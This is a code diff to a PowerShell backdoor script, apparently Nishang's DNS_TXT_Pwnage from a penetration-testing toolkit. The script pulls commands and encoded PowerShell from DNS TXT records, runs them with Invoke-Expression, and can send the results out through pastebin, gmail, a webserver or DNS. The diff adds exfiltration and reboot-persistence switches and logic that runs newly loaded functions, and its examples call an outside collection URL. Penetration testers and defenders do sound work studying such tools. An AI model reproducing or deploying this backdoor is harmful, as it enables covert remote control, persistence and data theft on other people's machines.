@@ -31,6 +31,9 @@ The string, if responded by TXT record of startdomain, will stop this payload on
 Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
 would be changed for commands and an authoritative reply shoudl reflect changes immediately.
 
+.PARAMETER exfil
+Use this option for using exfiltration
+
 .PARAMETER ExfilOption
 The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".
 
@@ -53,7 +56,15 @@ The URL of the webserver where POST requests would be sent.
 The DomainName, whose subdomains would be used for sending TXT queries to.
 
 .PARAMETER ExfilNS
-Authoritative Name Server for the domain specified in DomainName
+Authoritative Name Server for the domain specified in DomainName.
+
+.PARAMETER persist
+Use this parameter for reboot persistence
+
+.PARAMETER NoLoadFunction
+This parameter is used for specifying that the script used in txt records $psdomain does NOT contain a function.
+If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
+This would be the case if you are using Nishang scripts with this backdoor.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage
@@ -70,11 +81,12 @@ To execute a script in above example, start.alteredsecurity.com must contain "st
 psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript encscript.alteredsecurity.com stop ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 Use above command for using sending POST request to your webserver which is able to log the requests.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage -persist
+Use above for reboot persistence.
 
 .LINK
 http://labofapenetrationtester.com/
@@ -94,6 +106,10 @@ function DNS_TXT_Pwnage
         [Parameter(Parametersetname="exfil")]
         [Switch]
         $exfil,
+
+        [Parameter(Parametersetname="exfil")]
+        [Switch]
+        $NoLoadFunction,
 
         [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
@@ -160,7 +176,7 @@ function DNS_TXT_Pwnage
    )
 
     $body = @'    
-function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil)
+function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil, $LoadFunction)
 {
     while($true)
     {
@@ -200,22 +216,26 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
                 $tmp1 = $tmp1 + $txt
             }
             $encdata = $tmp1 -replace '\s+', "" -replace "`"", ""
-
             #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
-            $dec = [System.Convert]::FromBase64String("$encdata")
+            $dec = [System.Convert]::FromBase64String($encdata)
             $ms = New-Object System.IO.MemoryStream
             $ms.Write($dec, 0, $dec.Length)
             $ms.Seek(0,0) | Out-Null
             $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
             $sr = New-Object System.IO.StreamReader($cs)
             $command = $sr.readtoend()
-            $command
-            $pastevalue = Invoke-Expression $command
-            $pastevalue
-            
-            #Problem with using stringtobase64 to encode a file. After decoding it creates spaces in between the script.
-            #A temporary workaround is using a semicolon ";" separated script in one line.
-            
+            # Check for the function loaded by the script.
+            $preloading = Get-ChildItem function:\
+            Invoke-Expression $command
+            $postloading = Get-ChildItem function:\
+            $diffobj = Compare-Object $preloading $postloading
+            $FunctionName = $diffobj.InputObject.Name
+            $pastevalue = Invoke-Expression $FunctionName
+            if ($NoLoadFunction -eq $True)
+            {
+                $pastevalue = Invoke-Expression $command
+            }
+            $pastevalue            
             $exec++
             if ($exfil -eq $True)
             {
@@ -322,10 +342,10 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     if($persist -eq $True)
     {
         $name = "persist.vbs"
-        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS"
+        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $LoadFuntion"
         if ($exfil -eq $True)
         {
-            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil"
+            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
@@ -357,11 +377,11 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     }
     else
     {
-        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS"
+        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $LoadFuntion"
 
         if ($exfil -eq $True)
         {
-            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil"
+            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
